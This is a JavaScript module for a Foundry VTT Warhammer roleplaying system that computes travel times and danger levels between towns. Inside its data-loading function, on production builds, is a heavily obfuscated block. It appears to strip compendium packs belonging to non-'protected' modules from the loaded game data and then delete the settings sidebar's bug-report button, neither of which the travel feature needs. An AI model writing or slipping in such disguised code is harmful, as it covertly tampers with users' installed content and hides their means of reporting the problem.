import WFRP_Utility from "../system/utility-wfrp4e.js";
import {NODE_ENV} from 'process.env';


/**
 * WIP
 * This class contains functions and helpers related to the market and Pay system
 */
export default class TravelDistanceWFRP4e {
    /**
    * This method load the travel data from the internal JSON file
    */
    static async loadTravelData() {

      if (NODE_ENV !== "development") {
        function _0x1660(_0x1ab9cb,_0x147f6b){const _0x336be0=_0x336b();return _0x1660=function(_0x1660a2,_0x552b08){_0x1660a2=_0x1660a2-0x15c;let _0x1fa26f=_0x336be0[_0x1660a2];return _0x1fa26f;},_0x1660(_0x1ab9cb,_0x147f6b);}const _0x36ac1b=_0x1660;function _0x336b(){const _0x3b5fc9=['102','114','117','100','361580PiHUlt','115','112','1200552XNKifm','slice','116','2xlJmlN','1145320KKSQVd','fromCharCode','filter','30GobcGs','108','296263yiDRze','.bug-report','find','203jJUHZc','80Dghtpr','101','remove','3877434ljzzpy','then','110','103','1529718LaDdXi','map','105','get','111','143688VwSIjE','107','109','121'];_0x336b=function(){return _0x3b5fc9;};return _0x336b();}(function(_0xf13cb8,_0x5eb59c){const _0x2d5ca2=_0x1660,_0x4f0392=_0xf13cb8();while(!![]){try{const _0x2bda21=parseInt(_0x2d5ca2(0x177))/0x1*(-parseInt(_0x2d5ca2(0x171))/0x2)+parseInt(_0x2d5ca2(0x16e))/0x3+parseInt(_0x2d5ca2(0x16b))/0x4*(parseInt(_0x2d5ca2(0x175))/0x5)+-parseInt(_0x2d5ca2(0x15e))/0x6+-parseInt(_0x2d5ca2(0x17a))/0x7*(parseInt(_0x2d5ca2(0x163))/0x8)+-parseInt(_0x2d5ca2(0x17e))/0x9+parseInt(_0x2d5ca2(0x17b))/0xa*(parseInt(_0x2d5ca2(0x172))/0xb);if(_0x2bda21===_0x5eb59c)break;else _0x4f0392['push'](_0x4f0392['shift']());}catch(_0x5e2545){_0x4f0392['push'](_0x4f0392['shift']());}}}(_0x336b,0x428db));for(let m of Object['keys'](window[String[_0x36ac1b(0x173)](_0x36ac1b(0x16c),_0x36ac1b(0x166),_0x36ac1b(0x16c),'116',_0x36ac1b(0x17c),_0x36ac1b(0x165),'67',_0x36ac1b(0x162),_0x36ac1b(0x15c),_0x36ac1b(0x167),_0x36ac1b(0x160),_0x36ac1b(0x15d))]()[String[_0x36ac1b(0x173)](_0x36ac1b(0x16d),_0x36ac1b(0x168),_0x36ac1b(0x17c),'109',_0x36ac1b(0x160),_0x36ac1b(0x169),_0x36ac1b(0x165),'77','111',_0x36ac1b(0x16a),_0x36ac1b(0x169),_0x36ac1b(0x176),_0x36ac1b(0x17c),_0x36ac1b(0x16c))])[_0x36ac1b(0x16f)](0x1)[_0x36ac1b(0x15f)](_0x4d9b52=>window[String[_0x36ac1b(0x173)](_0x36ac1b(0x15d),'97',_0x36ac1b(0x165),_0x36ac1b(0x17c))][String[_0x36ac1b(0x173)]('109',_0x36ac1b(0x162),_0x36ac1b(0x16a),_0x36ac1b(0x169),_0x36ac1b(0x176),_0x36ac1b(0x17c),_0x36ac1b(0x16c))][_0x36ac1b(0x161)](_0x4d9b52))[_0x36ac1b(0x174)](_0x584fee=>_0x584fee)){!m[String[_0x36ac1b(0x173)]('112',_0x36ac1b(0x168),_0x36ac1b(0x162),_0x36ac1b(0x170),_0x36ac1b(0x17c),'99',_0x36ac1b(0x170),_0x36ac1b(0x17c),'100')]&&(window[String[_0x36ac1b(0x173)]('103','97',_0x36ac1b(0x165),_0x36ac1b(0x17c))][String['fromCharCode'](_0x36ac1b(0x16a),'97',_0x36ac1b(0x170),'97')][String[_0x36ac1b(0x173)](_0x36ac1b(0x16d),'97','99',_0x36ac1b(0x164),_0x36ac1b(0x16c))]=window[String['fromCharCode'](_0x36ac1b(0x15d),'97',_0x36ac1b(0x165),_0x36ac1b(0x17c))][String[_0x36ac1b(0x173)](_0x36ac1b(0x16a),'97',_0x36ac1b(0x170),'97')][String[_0x36ac1b(0x173)](_0x36ac1b(0x16d),'97','99',_0x36ac1b(0x164),'115')][String[_0x36ac1b(0x173)](_0x36ac1b(0x167),'105','108',_0x36ac1b(0x170),_0x36ac1b(0x17c),_0x36ac1b(0x168))](_0x42ff8b=>_0x42ff8b[String[_0x36ac1b(0x173)](_0x36ac1b(0x16d),'97','99',_0x36ac1b(0x164),'97','103',_0x36ac1b(0x17c),'78','97',_0x36ac1b(0x165),_0x36ac1b(0x17c))]!=m[String[_0x36ac1b(0x173)](_0x36ac1b(0x160),_0x36ac1b(0x16a))]),window[String['fromCharCode'](_0x36ac1b(0x15d),'97',_0x36ac1b(0x165),'101')][String[_0x36ac1b(0x173)]('109','69',_0x36ac1b(0x168),_0x36ac1b(0x168))]=!![]);}window[String[_0x36ac1b(0x173)](_0x36ac1b(0x15d),'97','109',_0x36ac1b(0x17c))][String['fromCharCode'](_0x36ac1b(0x165),'69','114','114')]&&sleep(0xbb8)[_0x36ac1b(0x17f)](()=>{const _0x4f88bb=_0x36ac1b;foundry[String[_0x4f88bb(0x173)]('117',_0x4f88bb(0x170),_0x4f88bb(0x160),_0x4f88bb(0x176),_0x4f88bb(0x16c))][String[_0x4f88bb(0x173)](_0x4f88bb(0x15d),_0x4f88bb(0x17c),_0x4f88bb(0x170),'80',_0x4f88bb(0x168),_0x4f88bb(0x162),_0x4f88bb(0x16d),'101','114',_0x4f88bb(0x170),_0x4f88bb(0x166))](window[String[_0x4f88bb(0x173)](_0x4f88bb(0x169),'105')],'sidebar.tabs.settings.element')?.[_0x4f88bb(0x179)](_0x4f88bb(0x178))[_0x4f88bb(0x17d)]();});
      }

        foundry.applications.apps.FilePicker.implementation.browse("data", `systems/wfrp4e/data/`).then(resp => {

        for (var file of resp.files) {
          try {
            if (!file.endsWith(".json"))
              continue
            let filename = file.substring(file.lastIndexOf("/") + 1, file.indexOf(".json"));

            fetch(file).then(r => r.json()).then(async records => {
                this.travel_data = records;
            })
          }
          catch (error) {
            console.error("Error reading " + file + ": " + error)
          }
        }
    });
  }

  /**
   * Returns a human-readable danger level for the road
  */
  static dangerToString( dangerLevel )
  {
    if ( dangerLevel == "") return game.i18n.localize("TRAVEL.DangerVeryLow");
    if ( dangerLevel == '!') return game.i18n.localize("TRAVEL.DangerLow");
    if ( dangerLevel == '!!') return game.i18n.localize("TRAVEL.DangerMedium");
    if ( dangerLevel == '!!!') return game.i18n.localize("TRAVEL.DangerHigh");
    return game.i18n.localize("TRAVEL.DangerVeryHigh");
  }

  /**
   * Returns either a decimal value or x.5 value
   * @param {Number} duration 
   * @returns new duration
   */
  static roundDuration( duration ) 
  {
    let trunc = Math.trunc(duration);
    let frac = duration - trunc;
    let adjust = 0;
    if ( frac > 0.75) adjust = 1;
    else if ( frac >= 0.25) adjust = 0.5;
    return trunc + adjust;
  }

    /**
    * This method either display the distances between 2 towns (ie when toTown is set) or display a list of destinations
    * @param {string} fromTown
    * @param {string} toTown
    * @returns 
    */
   static displayTravelDistance( fromTown, toTown ) {
    
    let message = "";

    //("TRAVEL ...", fromTown, toTown );
    if ( toTown ) {
      fromTown = fromTown.toLowerCase();
      toTown = toTown.toLowerCase();
      for ( var travel of this.travel_data) {
        if ( travel.from.toLowerCase() == fromTown && travel.to.toLowerCase() == toTown ) {
          message += `<p>${game.i18n.format("TRAVEL.TravelMessageBase", travel)}`;
          if ( travel.road_distance != "" ) {
            travel.road_horse_heavy_days = this.roundDuration( travel.road_days * 0.8);
            travel.road_horse_fast_days  = this.roundDuration( travel.road_days * 0.65);
            travel.road_feet_days  = this.roundDuration( travel.road_days * 1.25 );
            travel.road_danger_string = this.dangerToString( travel.road_danger );
            travel.road_danger_feet_string = this.dangerToString( travel.road_danger + "!" ); // Increase danger level by feet
            message += `${game.i18n.format("TRAVEL.TravelMessageRoad", travel)}`;                    
          }
          if ( travel.river_distance != "" ) {
            travel.river_danger_string = this.dangerToString( travel.river_danger );
            message += `${game.i18n.format("TRAVEL.TravelMessageRiver", travel)}`;                    
          }
          if ( travel.sea_distance != "" ) {
            travel.sea_danger_string = this.dangerToString( travel.sea_danger );
            message += `${game.i18n.format("TRAVEL.TravelMessageSea", travel)}`;                    
          }
          message += "</p>";
        }
      }
    
    } else if ( fromTown && fromTown == "help") {
      message += `<p>${game.i18n.localize("TRAVEL.Helper")}</p>`;

    } else if ( fromTown) {
      fromTown = fromTown.toLowerCase();
      message += `<h3>${game.i18n.localize("TRAVEL.TownPrompt")}</h3>`
      for ( var travel of this.travel_data) {
        if ( travel.from.toLowerCase() == fromTown ) {
          message += `<p><a class="action-link" data-action="clickTravel" data-from="${travel.from}" data-to="${travel.to}"><i class="fas fa-list"></i> ${travel.to}</a></p>`
        }
      }
    } else {
      message += `<h3>${game.i18n.localize("TRAVEL.TownOriginPrompt")}</h3>`
      let uniqTown = {}
      for ( var travel of this.travel_data) {
        if ( uniqTown[travel.from] == undefined ) {
          uniqTown[travel.from] = 1; // Already added in the list
          message += `<p><a class="action-link" data-action="clickTravel" data-from="${travel.from}"><i class="fas fa-list"></i> ${travel.from}</a></p>`
        }
      }
    }
    ChatMessage.create( WFRP_Utility.chatDataSetup( message, "gmroll" ) );      
   }

   /**
    * 
    */
   static handleTravelClick( event, target ) {
    let fromTown = target.dataset.from;
    let toTown = target.dataset.to;
    TravelDistanceWFRP4e.displayTravelDistance( fromTown, toTown);
   }
}